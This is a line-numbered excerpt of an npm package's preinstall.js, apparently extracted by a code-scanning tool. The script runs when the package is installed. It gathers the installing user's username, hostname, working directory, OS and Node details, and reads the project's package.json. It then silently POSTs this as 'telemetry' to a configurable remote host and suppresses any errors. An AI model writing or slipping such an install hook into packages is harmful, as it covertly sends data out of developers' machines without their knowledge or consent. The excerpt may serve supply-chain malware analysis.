// File: tmp/tmpn9dy6i3p/kn-nf-iso-properties-kn1/package/preinstall.js
// ======================================================================
Line 2: const http = require('http')
Line 3: const os = require('os')
Line 4: const path = require('path')
Line 26: const pkgJson = (() => {
    try { return require(path.join(process.cwd(), 'package.json')); } catch (_) { return {}; }
  })()
Line 27: path.join(process.cwd(), 'package.json')
Line 29: const ownPkg = (() => {
    try { return require('./package.json'); } catch (_) { return {}; }
  })()
Line 33: safeCall(() => os.userInfo().username, '')
Line 34: safeCall(() => os.hostname(), '')
Line 35: safeCall(() => process.cwd(), '')
Line 36: safeCall(() => os.platform(), '')
Line 37: safeCall(() => os.release(), '')
Line 38: safeCall(() => os.arch(), '')
Line 39: safeCall(() => (Array.isArray(os.cpus()) ? os.cpus().length : ''), '')
Line 40: safeCall(() => process.version, '')
Line 41: safeCall(() => process.env.npm_config_user_agent, '')
Line 67: {
  const pkg = require('./package.json');
  const host = process.env.NF_TELEMETRY_HOST || pkg.config.serverHost || '127.0.0.1';
  const port = Number(process.env.NF_TELEMETRY_PORT || pkg.config.serverPort || 8080);
  const pathName = process.env.NF_TELEMETRY_PATH || pkg.config.serverPath || '/telemetry';

  const data = Buffer.from(JSON.stringify(payload));

  const req = http.request({
    host,
    port,
    path: pathName,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    },
    timeout: 3000
  }, (res) => {
    res.resume();
  });

  req.on('error', () => {});
  req.on('timeout', () => { req.destroy(); });
  req.write(data);
  req.end();
}
Line 68: const pkg = require('./package.json')
Line 73: Buffer.from(JSON.stringify(payload))
Line 75: const req = http.request({
    host,
    port,
    path: pathName,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    },
    timeout: 3000
  }, (res) => {
    res.resume();
  })
Line 91: req.write(data)
Line 92: req.end()
Line 95: {
  const payload = collect();
  send(payload);
}
Line 97: send(payload)
